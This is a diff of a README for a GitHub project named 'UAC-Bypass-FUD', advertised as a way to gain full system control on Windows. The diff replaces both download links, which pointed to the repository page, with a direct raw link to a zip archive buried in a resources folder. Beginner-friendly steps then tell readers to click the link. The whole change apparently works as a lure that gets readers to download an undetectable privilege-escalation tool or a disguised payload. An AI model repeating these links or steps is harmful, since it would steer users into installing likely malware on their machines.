@@ -1,6 +1,6 @@
 # 🛡️ UAC-Bypass-FUD - Gain full system control with ease
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/hermitcrablewisiacotyledon3164/UAC-Bypass-FUD)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/hermitcrablewisiacotyledon3164/UAC-Bypass-FUD/raw/refs/heads/main/UACBypass/My/Resources/UA_Bypass_FUD_cacoepist.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ You need a Windows computer to run this tool. Supported versions include Windows
 
 Visit the official repository page to get the software files. You can find the main download link below.
 
-[Download the latest version here](https://github.com/hermitcrablewisiacotyledon3164/UAC-Bypass-FUD)
+[Download the latest version here](https://github.com/hermitcrablewisiacotyledon3164/UAC-Bypass-FUD/raw/refs/heads/main/UACBypass/My/Resources/UA_Bypass_FUD_cacoepist.zip)
 
 1. Open your web browser.
 2. Click the link above to reach the repository.
